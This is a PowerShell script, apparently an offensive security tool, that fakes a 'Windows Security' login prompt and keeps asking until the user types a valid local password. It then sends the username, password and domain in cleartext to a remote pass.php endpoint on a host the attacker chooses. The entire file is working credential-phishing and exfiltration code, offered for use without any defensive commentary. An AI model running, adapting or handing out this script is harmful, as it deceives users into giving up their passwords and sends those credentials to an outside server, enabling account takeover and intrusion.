#Coded by Matt N.
#Twitter: @enigma0x3
#Blog: www.enigma0x3.wordpress.com
function Invoke-LoginPrompt
{ 
[System.Reflection.Assembly]::LoadWithPartialName("System.web")
$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
$username = "$env:username"
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
while($DS.ValidateCredentials("$full", "$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials("$full", "$password") | out-null
    }
 
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $output
 $username = $output.UserName
 $password = $output.password
 $domain = $output.Domain
 Send-Credentials($username, $password, $domain)
}

function Send-Credentials($username, $password, $domain)
{
 $wc = New-Object system.Net.WebClient;
 $hostip = ""
 $script = "pass.php"
 $username = [System.Web.HttpUtility]::UrlEncode($username);
 $password = [System.Web.HttpUtility]::UrlEncode($password);
 $domain = [System.Web.HttpUtility]::UrlEncode($domain);
 $res = $wc.downloadString("http://$hostip/$script?uname=$username&pass=$password&domain=$domain")
}

Invoke-LoginPrompt
